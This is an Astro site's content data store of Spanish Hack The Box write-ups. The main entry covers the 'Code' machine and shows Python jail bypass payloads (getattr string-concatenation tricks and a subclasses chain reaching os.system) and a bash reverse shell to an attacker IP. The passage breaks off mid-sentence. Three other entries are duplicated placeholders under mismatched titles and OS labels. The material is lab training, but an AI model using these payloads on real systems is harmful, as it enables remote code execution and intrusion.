[["Map",1,2,9,10],"meta::meta",["Map",3,4,5,6,7,8],"astro-version","5.13.5","content-config-digest","809fb02183a141eb","astro-config-digest","{\"root\":{},\"srcDir\":{},\"publicDir\":{},\"outDir\":{},\"cacheDir\":{},\"site\":\"https://ajcipher.github.io\",\"compressHTML\":true,\"base\":\"/writeups-hacking\",\"trailingSlash\":\"ignore\",\"output\":\"static\",\"scopedStyleStrategy\":\"attribute\",\"build\":{\"format\":\"directory\",\"client\":{},\"server\":{},\"assets\":\"_astro\",\"serverEntry\":\"entry.mjs\",\"redirects\":true,\"inlineStylesheets\":\"auto\",\"concurrency\":1},\"server\":{\"open\":false,\"host\":true,\"port\":4321,\"streaming\":true,\"allowedHosts\":[]},\"redirects\":{},\"image\":{\"endpoint\":{\"route\":\"/_image\"},\"service\":{\"entrypoint\":\"astro/assets/services/sharp\",\"config\":{}},\"domains\":[],\"remotePatterns\":[],\"responsiveStyles\":false},\"devToolbar\":{\"enabled\":true},\"markdown\":{\"syntaxHighlight\":{\"type\":\"shiki\",\"excludeLangs\":[\"math\"]},\"shikiConfig\":{\"langs\":[],\"langAlias\":{},\"theme\":\"github-dark\",\"themes\":{},\"wrap\":false,\"transformers\":[]},\"remarkPlugins\":[],\"rehypePlugins\":[],\"remarkRehype\":{},\"gfm\":true,\"smartypants\":true},\"security\":{\"checkOrigin\":true},\"env\":{\"schema\":{},\"validateSecrets\":false},\"experimental\":{\"clientPrerender\":false,\"contentIntellisense\":false,\"headingIdCompat\":false,\"preserveScriptOrder\":false,\"liveContentCollections\":false,\"csp\":false,\"staticImportMetaEnv\":false,\"chromeDevtoolsWorkspace\":false},\"legacy\":{\"collections\":false}}","writeups",["Map",11,12,60,61,85,86,110,111],"prueba",{"id":11,"data":13,"body":27,"filePath":28,"digest":29,"rendered":30,"legacyId":59},{"title":14,"os":15,"img":16,"plataforma":17,"dificultad":18,"skills":19,"description":26},"Prueba","Linux","Code_logo.png","Hackthebox","Dificil",[20,21,22,23,24,25],"Web Enumeration","Python Jail","Python Reverse Shell Restriction Bypass","Database SQLite File Enumeration","Cracking Hashes","SQL Injection SQLI","Máquina facil para prácticar técnicas de bypass en python.","### ⚠️Descripción\n\nCode es una máquina Linux sencilla que cuenta con una aplicación web Python Code Editor vulnerable a la ejecución remota de código mediante un bypass de Python Jail. Después de obtener acceso como usuario de producción de la aplicación, se pueden encontrar credenciales descifrables en un archivo de base de datos sqlite3. Con estas credenciales, se obtiene acceso a otro usuario, martin , que tiene permisos sudo para un script de utilidad de respaldo, backy.sh . Este script incluye una sección de código vulnerable que, cuando se explota, nos permite escalar nuestros privilegios creando una copia de la carpeta raı́z.\n\n### Objetivos\n\n#### Objetivo general\n\nDesarrollar habilidades de análisis y explotación en entornos restringidos de ejecución de código en Python (Python Jail), con el fin de fortalecer el conocimiento sobre vulnerabilidades, evasión de filtros y seguridad en aplicaciones que ejecutan código dinámico.. Como es el caso de la Máquina Code. \n\n#### Objetivos Especificos\n\n- Comprender el funcionamiento interno del lenguaje Python, incluyendo introspección, objetos y estructuras dinámicas como builtins , getattr, eval y exec. \n- Identificar y evadir mecanismos de restricción artificial (filtros, listas negras, entornos limitados) impuestos en un entorno tipo jail. \n- Aplicar técnicas ofensivas de bypass, como reconstrucción de funciones prohibidas, manipulación de clases y uso de expresiones indirectas para ejecutar código arbitrario. \n- Evaluar los riesgos de seguridad asociados con la ejecución de código Python no controlado, como el uso inseguro de eval, input o exec en aplicaciones web o automatizadas.\u003Cbr>  \n\n\n### Analisis de Vulnerabilidades\n\n#### Reconocimiento Inicial\n\nSe comenzó realizando un análisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificación resultó fundamental para asegurar que la comunicación entre el host atacante y el sistema de destino fuera posible antes de iniciar fases más avanzadas de la evaluación. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorı́as de seguridad:\n\n**Ping**, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, además de obtener información básica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el **TTL**.\n\n![Ejecución del comando ping](/code/ping.png)\n\n**Nmap**, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.\n\n![Ejecución del comando ping](/code/nmap.png)\n\nEste proceso inicial permitió obtener una visión general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluación.","src/content/writeups/prueba.md","dcabede74e0343d8",{"html":31,"metadata":32},"\u003Ch3 id=\"️descripción\">⚠️Descripción\u003C/h3>\n\u003Cp>Code es una máquina Linux sencilla que cuenta con una aplicación web Python Code Editor vulnerable a la ejecución remota de código mediante un bypass de Python Jail. Después de obtener acceso como usuario de producción de la aplicación, se pueden encontrar credenciales descifrables en un archivo de base de datos sqlite3. Con estas credenciales, se obtiene acceso a otro usuario, martin , que tiene permisos sudo para un script de utilidad de respaldo, backy.sh . Este script incluye una sección de código vulnerable que, cuando se explota, nos permite escalar nuestros privilegios creando una copia de la carpeta raı́z.\u003C/p>\n\u003Ch3 id=\"objetivos\">Objetivos\u003C/h3>\n\u003Ch4 id=\"objetivo-general\">Objetivo general\u003C/h4>\n\u003Cp>Desarrollar habilidades de análisis y explotación en entornos restringidos de ejecución de código en Python (Python Jail), con el fin de fortalecer el conocimiento sobre vulnerabilidades, evasión de filtros y seguridad en aplicaciones que ejecutan código dinámico.. Como es el caso de la Máquina Code.\u003C/p>\n\u003Ch4 id=\"objetivos-especificos\">Objetivos Especificos\u003C/h4>\n\u003Cul>\n\u003Cli>Comprender el funcionamiento interno del lenguaje Python, incluyendo introspección, objetos y estructuras dinámicas como builtins , getattr, eval y exec.\u003C/li>\n\u003Cli>Identificar y evadir mecanismos de restricción artificial (filtros, listas negras, entornos limitados) impuestos en un entorno tipo jail.\u003C/li>\n\u003Cli>Aplicar técnicas ofensivas de bypass, como reconstrucción de funciones prohibidas, manipulación de clases y uso de expresiones indirectas para ejecutar código arbitrario.\u003C/li>\n\u003Cli>Evaluar los riesgos de seguridad asociados con la ejecución de código Python no controlado, como el uso inseguro de eval, input o exec en aplicaciones web o automatizadas.\u003Cbr>\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"analisis-de-vulnerabilidades\">Analisis de Vulnerabilidades\u003C/h3>\n\u003Ch4 id=\"reconocimiento-inicial\">Reconocimiento Inicial\u003C/h4>\n\u003Cp>Se comenzó realizando un análisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificación resultó fundamental para asegurar que la comunicación entre el host atacante y el sistema de destino fuera posible antes de iniciar fases más avanzadas de la evaluación. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorı́as de seguridad:\u003C/p>\n\u003Cp>\u003Cstrong>Ping\u003C/strong>, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, además de obtener información básica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el \u003Cstrong>TTL\u003C/strong>.\u003C/p>\n\u003Cp>\u003Cimg src=\"/code/ping.png\" alt=\"Ejecución del comando ping\">\u003C/p>\n\u003Cp>\u003Cstrong>Nmap\u003C/strong>, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.\u003C/p>\n\u003Cp>\u003Cimg src=\"/code/nmap.png\" alt=\"Ejecución del comando ping\">\u003C/p>\n\u003Cp>Este proceso inicial permitió obtener una visión general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluación.\u003C/p>",{"headings":33,"localImagePaths":54,"remoteImagePaths":55,"frontmatter":56,"imagePaths":58},[34,38,41,45,48,51],{"depth":35,"slug":36,"text":37},3,"️descripción","⚠️Descripción",{"depth":35,"slug":39,"text":40},"objetivos","Objetivos",{"depth":42,"slug":43,"text":44},4,"objetivo-general","Objetivo general",{"depth":42,"slug":46,"text":47},"objetivos-especificos","Objetivos Especificos",{"depth":35,"slug":49,"text":50},"analisis-de-vulnerabilidades","Analisis de Vulnerabilidades",{"depth":42,"slug":52,"text":53},"reconocimiento-inicial","Reconocimiento Inicial",[],[],{"title":14,"os":15,"dificultad":18,"img":16,"skills":57,"plataforma":17,"description":26},[20,21,22,23,24,25],[],"prueba.md","tobi",{"id":60,"data":62,"body":67,"filePath":68,"digest":69,"rendered":70,"legacyId":84},{"title":63,"os":64,"img":16,"plataforma":17,"dificultad":65,"skills":66,"description":26},"Tobi","Windows","Insane",[20,21,22,23,24],"### ⚠️Descripción\n\nCode es una máquina Linux sencilla que cuenta con una aplicación web Python Code Editor vulnerable a la ejecución remota de código mediante un bypass de Python Jail. Después de obtener acceso como usuario de producción de la aplicación, se pueden encontrar credenciales descifrables en un archivo de base de datos sqlite3. Con estas credenciales, se obtiene acceso a otro usuario, martin , que tiene permisos sudo para un script de utilidad de respaldo, backy.sh . Este script incluye una sección de código vulnerable que, cuando se explota, nos permite escalar nuestros privilegios creando una copia de la carpeta raı́z.\n\n### Objetivos\n\n#### Objetivo general\n\nDesarrollar habilidades de análisis y explotación en entornos restringidos de ejecución de código en Python (Python Jail), con el fin de fortalecer el conocimiento sobre vulnerabilidades, evasión de filtros y seguridad en aplicaciones que ejecutan código dinámico.. Como es el caso de la Máquina Code. \n\n#### Objetivos Especificos\n\n- Comprender el funcionamiento interno del lenguaje Python, incluyendo introspección, objetos y estructuras dinámicas como builtins , getattr, eval y exec. \n- Identificar y evadir mecanismos de restricción artificial (filtros, listas negras, entornos limitados) impuestos en un entorno tipo jail. \n- Aplicar técnicas ofensivas de bypass, como reconstrucción de funciones prohibidas, manipulación de clases y uso de expresiones indirectas para ejecutar código arbitrario. \n- Evaluar los riesgos de seguridad asociados con la ejecución de código Python no controlado, como el uso inseguro de eval, input o exec en aplicaciones web o automatizadas.\u003Cbr>  \n\n\n### Analisis de Vulnerabilidades\n\n#### Reconocimiento Inicial\n\nSe comenzó realizando un análisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificación resultó fundamental para asegurar que la comunicación entre el host atacante y el sistema de destino fuera posible antes de iniciar fases más avanzadas de la evaluación. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorı́as de seguridad:\n\n**Ping**, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, además de obtener información básica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el **TTL**.\n\n![Ejecución del comando ping]( /code/ping.png)\n\n**Nmap**, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.\n\n![Ejecución del comando ping](/code/nmap.png)\n\nEste proceso inicial permitió obtener una visión general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluación.","src/content/writeups/tobi.md","882d5398562938fd",{"html":31,"metadata":71},{"headings":72,"localImagePaths":79,"remoteImagePaths":80,"frontmatter":81,"imagePaths":83},[73,74,75,76,77,78],{"depth":35,"slug":36,"text":37},{"depth":35,"slug":39,"text":40},{"depth":42,"slug":43,"text":44},{"depth":42,"slug":46,"text":47},{"depth":35,"slug":49,"text":50},{"depth":42,"slug":52,"text":53},[],[],{"title":63,"os":64,"dificultad":65,"img":16,"skills":82,"plataforma":17,"description":26},[20,21,22,23,24],[],"tobi.md","page",{"id":85,"data":87,"body":91,"filePath":92,"digest":93,"rendered":94,"legacyId":109},{"title":88,"os":64,"img":16,"plataforma":17,"dificultad":89,"skills":90,"description":26},"Kraken","Medio",[20,21,22,23,24],"### ⚠️Descripción\n\nCode es una máquina Linux sencilla que cuenta con una aplicación web Python Code Editor vulnerable a la ejecución remota de código mediante un bypass de Python Jail. Después de obtener acceso como usuario de producción de la aplicación, se pueden encontrar credenciales descifrables en un archivo de base de datos sqlite3. Con estas credenciales, se obtiene acceso a otro usuario, martin , que tiene permisos sudo para un script de utilidad de respaldo, backy.sh . Este script incluye una sección de código vulnerable que, cuando se explota, nos permite escalar nuestros privilegios creando una copia de la carpeta raı́z.\n\n### Objetivos\n\n#### Objetivo general\n\nDesarrollar habilidades de análisis y explotación en entornos restringidos de ejecución de código en Python (Python Jail), con el fin de fortalecer el conocimiento sobre vulnerabilidades, evasión de filtros y seguridad en aplicaciones que ejecutan código dinámico.. Como es el caso de la Máquina Code. \n\n#### Objetivos Especificos\n\n- Comprender el funcionamiento interno del lenguaje Python, incluyendo introspección, objetos y estructuras dinámicas como builtins , getattr, eval y exec. \n- Identificar y evadir mecanismos de restricción artificial (filtros, listas negras, entornos limitados) impuestos en un entorno tipo jail. \n- Aplicar técnicas ofensivas de bypass, como reconstrucción de funciones prohibidas, manipulación de clases y uso de expresiones indirectas para ejecutar código arbitrario. \n- Evaluar los riesgos de seguridad asociados con la ejecución de código Python no controlado, como el uso inseguro de eval, input o exec en aplicaciones web o automatizadas.\u003Cbr>  \n\n\n### Analisis de Vulnerabilidades\n\n#### Reconocimiento Inicial\n\nSe comenzó realizando un análisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificación resultó fundamental para asegurar que la comunicación entre el host atacante y el sistema de destino fuera posible antes de iniciar fases más avanzadas de la evaluación. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorı́as de seguridad:\n\n**Ping**, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, además de obtener información básica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el **TTL**.\n\n![Ejecución del comando ping](/code/ping.png)\n\n**Nmap**, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.\n\n![Ejecución del comando ping](/code/nmap.png)\n\nEste proceso inicial permitió obtener una visión general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluación.\n\n```python\ntest = getattr(print.__self__, '__im' + 'port__') ('o' + 's')\ngetattr(test, 'sy' + 'stem')( 'whoami')\n```","src/content/writeups/page.md","b3292f74ef0f118a",{"html":95,"metadata":96},"\u003Ch3 id=\"️descripción\">⚠️Descripción\u003C/h3>\n\u003Cp>Code es una máquina Linux sencilla que cuenta con una aplicación web Python Code Editor vulnerable a la ejecución remota de código mediante un bypass de Python Jail. Después de obtener acceso como usuario de producción de la aplicación, se pueden encontrar credenciales descifrables en un archivo de base de datos sqlite3. Con estas credenciales, se obtiene acceso a otro usuario, martin , que tiene permisos sudo para un script de utilidad de respaldo, backy.sh . Este script incluye una sección de código vulnerable que, cuando se explota, nos permite escalar nuestros privilegios creando una copia de la carpeta raı́z.\u003C/p>\n\u003Ch3 id=\"objetivos\">Objetivos\u003C/h3>\n\u003Ch4 id=\"objetivo-general\">Objetivo general\u003C/h4>\n\u003Cp>Desarrollar habilidades de análisis y explotación en entornos restringidos de ejecución de código en Python (Python Jail), con el fin de fortalecer el conocimiento sobre vulnerabilidades, evasión de filtros y seguridad en aplicaciones que ejecutan código dinámico.. Como es el caso de la Máquina Code.\u003C/p>\n\u003Ch4 id=\"objetivos-especificos\">Objetivos Especificos\u003C/h4>\n\u003Cul>\n\u003Cli>Comprender el funcionamiento interno del lenguaje Python, incluyendo introspección, objetos y estructuras dinámicas como builtins , getattr, eval y exec.\u003C/li>\n\u003Cli>Identificar y evadir mecanismos de restricción artificial (filtros, listas negras, entornos limitados) impuestos en un entorno tipo jail.\u003C/li>\n\u003Cli>Aplicar técnicas ofensivas de bypass, como reconstrucción de funciones prohibidas, manipulación de clases y uso de expresiones indirectas para ejecutar código arbitrario.\u003C/li>\n\u003Cli>Evaluar los riesgos de seguridad asociados con la ejecución de código Python no controlado, como el uso inseguro de eval, input o exec en aplicaciones web o automatizadas.\u003Cbr>\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"analisis-de-vulnerabilidades\">Analisis de Vulnerabilidades\u003C/h3>\n\u003Ch4 id=\"reconocimiento-inicial\">Reconocimiento Inicial\u003C/h4>\n\u003Cp>Se comenzó realizando un análisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificación resultó fundamental para asegurar que la comunicación entre el host atacante y el sistema de destino fuera posible antes de iniciar fases más avanzadas de la evaluación. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorı́as de seguridad:\u003C/p>\n\u003Cp>\u003Cstrong>Ping\u003C/strong>, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, además de obtener información básica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el \u003Cstrong>TTL\u003C/strong>.\u003C/p>\n\u003Cp>\u003Cimg src=\"/code/ping.png\" alt=\"Ejecución del comando ping\">\u003C/p>\n\u003Cp>\u003Cstrong>Nmap\u003C/strong>, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.\u003C/p>\n\u003Cp>\u003Cimg src=\"/code/nmap.png\" alt=\"Ejecución del comando ping\">\u003C/p>\n\u003Cp>Este proceso inicial permitió obtener una visión general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluación.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">test \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> getattr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#79B8FF\">__self__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'__im'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'port__'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'o'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 's'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">getattr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(test, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'sy'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'stem'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)( \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'whoami'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>",{"headings":97,"localImagePaths":104,"remoteImagePaths":105,"frontmatter":106,"imagePaths":108},[98,99,100,101,102,103],{"depth":35,"slug":36,"text":37},{"depth":35,"slug":39,"text":40},{"depth":42,"slug":43,"text":44},{"depth":42,"slug":46,"text":47},{"depth":35,"slug":49,"text":50},{"depth":42,"slug":52,"text":53},[],[],{"title":88,"os":64,"dificultad":89,"img":16,"skills":107,"plataforma":17,"description":26},[20,21,22,23,24],[],"page.md","code",{"id":110,"data":112,"body":120,"filePath":121,"digest":122,"rendered":123,"legacyId":161},{"title":113,"os":15,"img":16,"plataforma":17,"dificultad":114,"skills":115,"description":119},"Code","Facil",[20,116,23,24,117,118],"Python Jail (Reverse Shell Restriction Bypass)","Directory Path Traversal Restriction Bypass","Abusing Sudoers (Privelege Escalation)","Code es una máquina Linux sencilla que cuenta con una aplicación web Python Code Editor vulnerable a la ejecución remota de código mediante un bypass de Python Jail.","### Descripción\n\nCode es una máquina Linux sencilla que cuenta con una aplicación web Python Code Editor vulnerable a la ejecución remota de código mediante un bypass de Python Jail. Después de obtener acceso como usuario de producción de la aplicación, se pueden encontrar credenciales descifrables en un archivo de base de datos sqlite3. Con estas credenciales, se obtiene acceso a otro usuario, martin , que tiene permisos sudo para un script de utilidad de respaldo, backy.sh . Este script incluye una sección de código vulnerable que, cuando se explota, nos permite escalar nuestros privilegios creando una copia de la carpeta raı́z.\n\n### Objetivos\n\n#### Objetivo general\n\nDesarrollar habilidades de análisis y explotación en entornos restringidos de ejecución de código en Python (Python Jail), con el fin de fortalecer el conocimiento sobre vulnerabilidades, evasión de filtros y seguridad en aplicaciones que ejecutan código dinámico.. Como es el caso de la Máquina Code. \n\n#### Objetivos Especificos\n\n- Comprender el funcionamiento interno del lenguaje Python, incluyendo introspección, objetos y estructuras dinámicas como builtins , getattr, eval y exec. \n- Identificar y evadir mecanismos de restricción artificial (filtros, listas negras, entornos limitados) impuestos en un entorno tipo jail. \n- Aplicar técnicas ofensivas de bypass, como reconstrucción de funciones prohibidas, manipulación de clases y uso de expresiones indirectas para ejecutar código arbitrario. \n- Evaluar los riesgos de seguridad asociados con la ejecución de código Python no controlado, como el uso inseguro de eval, input o exec en aplicaciones web o automatizadas.\u003Cbr>  \n\n\n### Analisis de Vulnerabilidades\n\n#### Reconocimiento Inicial\n\nSe comenzó realizando un análisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificación resultó fundamental para asegurar que la comunicación entre el host atacante y el sistema de destino fuera posible antes de iniciar fases más avanzadas de la evaluación. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorı́as de seguridad:\n\n**Ping**, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, además de obtener información básica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el **TTL**.\n\n[![Ejecución del comando ping](/code/ping.png)](/code/ping.png)\n\n**Nmap**, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.\n\n[![Ejecución del comando ping](/code/nmap.png)](/code/nmap.png)\n\nEste proceso inicial permitió obtener una visión general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluación.\n\n### Analisis de los servicios activos\n\nSeguidamente, una vez identificados los servicios activos en el sistema objetivo en este caso, el puerto 22/TCP, correspondiente al servicio SSH (Secure Shell), y el puerto 5000/TCP, que aloja un servicio web se procede a realizar un escaneo más exhaustivo y especı́fico sobre cada uno de ellos.\n\n#### Puerto 22 (SSH)\n\nEl hecho de que el puerto 22/TCP se encuentre activo indica que el sistema dispone de un servicio SSH (Secure Shell) en ejecución, lo que permite establecer una conexión remota segura mediante el uso de protocolos de cifrado para la transmisión de datos. Este servicio, comúnmente utilizado para la administración de servidores y dispositivos de red, brinda acceso a una lı́nea de comandos del sistema de destino, desde la cual es posible ejecutar comandos y realizar tareas de gestión.\n\nLa presencia de SSH implica que, si se dispone de credenciales válidas o se logra explotar alguna vulnerabilidad en su configuración o implementación, un atacante podrı́a obtener control remoto sobre el sistema. Por este motivo, resulta fundamental identificar la versión exacta del servicio, verificar la fortaleza de los mecanismos de autenticación implementados y evaluar la existencia de vulnerabilidades conocidas asociadas a esa versión especı́fica.\n\nEn el contexto de una evaluación de seguridad, este hallazgo se considera un punto de interés clave, ya que un servicio SSH mal configurado o desactualizado puede convertirse en una puerta de entrada directa al sistema.\n\nEl analisis demuestra que este servicio se esta ejecutando en un sistema operativo ubuntu como se muestra en la\nsiguiente imagen:\n\n[![Servicio de SSH (Secure Shell)](/code/ssh.png)](/code/ssh.png)\n\n#### Puerto 5000 (Servicio Web)\n\nAl ejecutar el comando **whatweb** desde la terminal, se obtiene información detallada acerca de las tecnologı́as y frameworks que utiliza el servicio web en el puerto correspondiente. El resultado de este análisis revela que el servicio está siendo ejecutado mediante **Gunicorn 20.0.4**.\n\n**Gunicorn** (Green Unicorn) es un servidor WSGI para aplicaciones Python ampliamente utilizado en entornos de producción debido a su simplicidad y eficiencia. La identificación de su versión especı́fica, en este caso **20.0.4**, resulta relevante ya que permite verificar si existen vulnerabilidades conocidas o configuraciones inseguras asociadas a dicha versión. Este tipo de información es fundamental para orientar fases posteriores de análisis, como la búsqueda en bases de datos de vulnerabilidades (por ejemplo, CVE o Exploit-DB) y la evaluación de posibles vectores de ataque contra el servicio.\n\n[![Servicio web puerto 5000 (Gunicorn)](/code/port5000.png)](/code/port5000.png)\n\nAl acceder al servicio web mediante un navegador utilizando la URL http://10.10.11.62:5000, se observa que el sistema está ejecutando un editor de código para el lenguaje de programación Python. Esta interfaz permite al usuario escribir y ejecutar código Python directamente desde el navegador, lo cual facilita la interacción y el desarrollo rápido dentro del entorno proporcionado.\n\nSi bien esta funcionalidad puede resultar muy útil en contextos controlados y para propósitos legı́timos, también implica un nivel considerable de riesgo desde la perspectiva de seguridad. La capacidad de ejecutar código remotamente sin las debidas restricciones o controles puede exponer el sistema a vulnerabilidades crı́ticas, tales como la ejecución arbitraria de código, escalación de privilegios o acceso no autorizado a recursos sensibles.\n\n[![Pagina web que corre un editor de código en lı́nea](/code/webpage.png)](/code/webpage.png)\n\n\n### Explotación del Sistema \n\nDado que podemos ejecutar código directamente desde la página de inicio, no es necesario crear una cuenta, a menos que queramos guardar o realizar un seguimiento de nuestro trabajo. Primero intentaremos cargar algunos módulos comunes, como import, os, write u open, ya que son fundamentales para ejecutar cargas útiles que interactúan con el sistema subyacente. Sin embargo, veremos inmediatamente que hay un filtro para impedirnos utilizar palabras clave restringidas y bloquear el uso de funciones y módulos potencialmente peligrosos.\n\n[![Implementación de reglas para impedir el uso de cargas útiles](/code/payload1.png)](/code/payload1.png)\n\nDada la presencia de mecanismos de filtrado que restringen la ejecución directa de código en el servicio web, se torna indispensable identificar métodos para eludir estos filtros con el fin de avanzar en la evaluación de seguridad. Para ello, se llevó a cabo una investigación exhaustiva utilizando palabras clave como “python bypass” en motores de búsqueda y bases de datos especializadas.\n\nComo resultado, se localizaron múltiples artı́culos y recursos técnicos que describen diversas técnicas para superar las restricciones impuestas en entornos Python. Estas técnicas incluyen manipulación avanzada de la sintaxis, uso de codificaciones alternativas, construcción dinámica de código y explotación de vulnerabilidades en componentes especı́ficos.\n\nLa información recopilada servirá como fundamento para la implementación de pruebas controladas destinadas a validar la efectividad de los filtros y detectar posibles brechas que puedan ser explotadas.\n\n#### Uso de build-in \n\nEn Python, los built-in (o funciones y objetos incorporados) son un conjunto de funciones, excepciones y tipos de datos que están disponibles de forma inmediata sin necesidad de importar ningún módulo o librerı́a adicional. Estos elementos forman parte del núcleo del lenguaje y proporcionan funcionalidades esenciales para realizar tareas comunes de programación.\n\n### Uso de getattr para evadir restricciones en Python\n\nLa función incorporada getattr(objeto, nombre atributo) en Python permite acceder dinámicamente a los atributos o métodos de un objeto usando el nombre del atributo como una cadena. Este comportamiento es especialmente útil para evadir filtros y restricciones que bloquean el acceso directo a funciones o métodos sensibles. En entornos con mecanismos de seguridad que detectan y bloquean llamadas explı́citas a funciones peligrosas (por ejemplo, os.system), getattr puede ser usada para ocultar la intención real del código. Como en el siguiente código:\n\n```python\ntest = getattr(print.__self__, '__im' + 'port__') ('o' + 's')\ngetattr(test, 'sy' + 'stem')( 'whoami')\n```\n\nOtro método efectivo para evadir restricciones en entornos Python está explicado en un \n\u003Ca href=\"https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d\" \n   class=\"text-blue-500 font-bold underline hover:text-blue-700 transition\">\n   artículo publicado en Medium\n\u003C/a>. A continuación, se presenta el fragmento de código descrito en dicho artículo:\n\n\n```python\n[w for w in 1..__class__.__base__.__subclasses__() if w.__name__=='Quitter'][0].__init__.__globals__['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']('ls')\n```\n\n#### Ejecución de comandos en el sistema\n\nEsto nos permitirá ejecutar comandos de shell sin utilizar palabras clave prohibidas como **≪import≫** u **≪os≫** directamente, utilizando la concatenación de cadenas, es decir, **≪o≫** + **≪s≫**. Sin embargo, tras ejecutar el código, no vemos ningún resultado. Esto sugiere que, aunque el código se esté ejecutando en el host, el resultado no se está devolviendo al frontend. Para verificar si se está ejecutando en el host, modificaremos nuestro enfoque e intentaremos redirigir el resultado a nuestra máquina utilizando un sencillo listener con el comando **tcpdump** para capturar la respuesta del comando **ping** ejecutado desde el servicio web.\n\n```python\ntest = getattr(print.__self__, '__im' + 'port__') ('o' + 's')\ngetattr (test, 'sy' + 'stem')('ping -c 1 10.10.x.x')\n```\n\nEjecución del código python en la web:\n\n[![Código python en la web](/code/payload2.png)](/code/payload2.png)\n\nRecibimos respuesta por parte del servido al ejecutar el comandon **ping**:\n\n[![Respuesta del comando ping](/code/term1.png)](/code/term1.png)\n\nSeguidamente ejecutaremos el siguiente código en el servicio web para obtener una **shell inversa** mediante **Netcat**:\n\n```python\ntest = getattr(print.__self__, '__im' + 'port__')('o' + 's')\ngetattr(test, 'sy' + 'stem')('bash -c \"bash -i >& /dev/tcp/10.10.x.x/443 0>&1\" ')\n```\nY ejecutamos en nuestra máquina de atacante **Netcat** en el puerto que especificamos en el 